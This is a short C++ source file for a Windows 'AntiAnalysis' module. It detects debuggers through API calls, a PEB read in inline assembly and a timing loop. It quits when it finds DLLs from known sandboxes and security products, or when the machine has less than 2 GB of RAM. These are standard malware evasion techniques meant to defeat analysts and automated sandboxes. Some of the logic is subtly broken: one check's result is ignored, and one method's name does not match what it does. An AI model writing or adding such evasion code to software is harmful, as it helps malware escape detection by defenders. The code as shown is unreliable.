#include "targetver.h"
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <vector>
#include <array>
#include "AntiAnalysis.h"

bool AntiAnalysis::IsDebugged() {
    if (IsDebuggerPresent()) return true;

    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    if (debugged) return true;

    __try {
        __asm {
            push eax
            mov eax, fs: [0x30]
            mov eax, [eax + 2]
            mov debugged, eax
            pop eax
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return true;
    }

    auto start = GetTickCount64();
    volatile int junk = 0;
    for (int i = 0; i < 1000000; ++i) junk += i;
    auto end = GetTickCount64();

    return (end - start > 100);
}

void AntiAnalysis::EvadeSandbox() {
    const char* blacklist[] = {
        "cmdvrt32.dll",
        "SxIn.dll",
        "SbieDll.dll",
        "Sf2.dll",
        "snxhk.dll",
        "dbghelp.dll",
        nullptr
    };

    for (int i = 0; blacklist[i]; ++i) {
        if (GetModuleHandleA(blacklist[i])) {
            ExitProcess(0);
        }
    }

    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo);
    GlobalMemoryStatusEx(&memInfo);

    if (memInfo.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
        ExitProcess(0);
    }
}

bool AntiAnalysis::CheckBlacklistedModules() {
    return IsDebugged();
}